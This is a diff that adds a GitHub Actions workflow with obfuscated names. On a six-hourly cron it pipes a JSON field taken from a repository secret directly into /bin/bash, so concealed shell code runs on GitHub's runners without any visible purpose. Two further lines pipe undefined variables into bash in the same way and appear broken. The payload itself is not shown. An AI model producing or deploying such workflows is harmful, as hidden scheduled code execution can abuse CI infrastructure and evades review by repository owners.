@@ -1,0 +1,19 @@
+name: dongliakp
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '19 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: dongliakp
+        env:
+          anfi88: ${{ secrets.anfi88 }}
+        run: |
+          echo $anfi88 | jq -r .stk66 | /bin/bash
+          echo $a3436 | jq -r .x67 | /bin/bash
+          echo $vik7957 | jq -r .b61 | /bin/bash
+
